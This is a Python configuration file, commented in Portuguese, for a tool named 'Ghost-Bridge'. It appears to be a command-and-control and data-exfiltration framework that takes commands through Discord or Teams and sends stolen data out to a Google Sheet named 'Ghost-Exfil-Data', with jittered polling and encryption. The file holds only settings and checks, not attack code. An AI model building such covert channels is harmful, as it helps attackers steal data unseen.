"""
Ghost-Bridge - Configuração Centralizada
Lê variáveis do arquivo .env ou usa valores padrão.
"""
import os
from dotenv import load_dotenv

# Carrega variáveis do .env (se existir)
load_dotenv()

# ==========================================
# MODO DE OPERAÇÃO
# ==========================================
# 'MOCK' = Simulado com JSON local (desenvolvimento)
# 'REAL' = Usa APIs reais (produção)
OPERATION_MODE = os.getenv('OPERATION_MODE', 'MOCK')

# ==========================================
# CONFIGURAÇÕES DE POLLING (Segundos)
# ==========================================
POLL_INTERVAL_MIN = int(os.getenv('POLL_INTERVAL_MIN', '2'))
POLL_INTERVAL_MAX = int(os.getenv('POLL_INTERVAL_MAX', '5'))

# ==========================================
# DISCORD (Downlink - Receber Comandos)
# ==========================================
DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN', '')
DISCORD_CHANNEL_ID = os.getenv('DISCORD_CHANNEL_ID', '')

# ==========================================
# MICROSOFT TEAMS (Alternativa ao Discord)
# ==========================================
TEAMS_WEBHOOK_URL = os.getenv('TEAMS_WEBHOOK_URL', '')
TEAMS_TENANT_ID = os.getenv('TEAMS_TENANT_ID', '')
TEAMS_CLIENT_ID = os.getenv('TEAMS_CLIENT_ID', '')
TEAMS_CLIENT_SECRET = os.getenv('TEAMS_CLIENT_SECRET', '')
TEAMS_CHANNEL_ID = os.getenv('TEAMS_CHANNEL_ID', '')

# ==========================================
# GOOGLE SHEETS (Uplink - Exfiltrar Dados)
# ==========================================
GOOGLE_CREDENTIALS_FILE = os.getenv('GOOGLE_CREDENTIALS_FILE', 'credentials.json')
GOOGLE_SHEET_NAME = os.getenv('GOOGLE_SHEET_NAME', 'Ghost-Exfil-Data')

# ==========================================
# GOOGLE DRIVE (Arquivos grandes)
# ==========================================
GOOGLE_DRIVE_FOLDER_ID = os.getenv('GOOGLE_DRIVE_FOLDER_ID', '')

# ==========================================
# CRIPTOGRAFIA
# ==========================================
# Se vazio, será gerada automaticamente em crypto_utils.py
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', '')

# ==========================================
# Validação de Configuração
# ==========================================
def validate_config():
    """Valida se as configurações necessárias estão presentes para o modo REAL."""
    if OPERATION_MODE == 'REAL':
        errors = []
        
        # Precisa de pelo menos um canal de Downlink
        has_downlink = bool(DISCORD_BOT_TOKEN and DISCORD_CHANNEL_ID) or \
                       bool(TEAMS_CLIENT_ID and TEAMS_CLIENT_SECRET)
        if not has_downlink:
            errors.append("Downlink: Configure DISCORD_* ou TEAMS_* no .env")
        
        # Precisa de Uplink (Google Sheets)
        if not os.path.exists(GOOGLE_CREDENTIALS_FILE):
            errors.append(f"Uplink: Arquivo '{GOOGLE_CREDENTIALS_FILE}' não encontrado")
        
        if errors:
            print("[!] ERRO DE CONFIGURAÇÃO:")
            for e in errors:
                print(f"    - {e}")
            return False
    
    return True

# Auto-validação ao importar (apenas avisa, não bloqueia)
if OPERATION_MODE == 'REAL':
    validate_config()
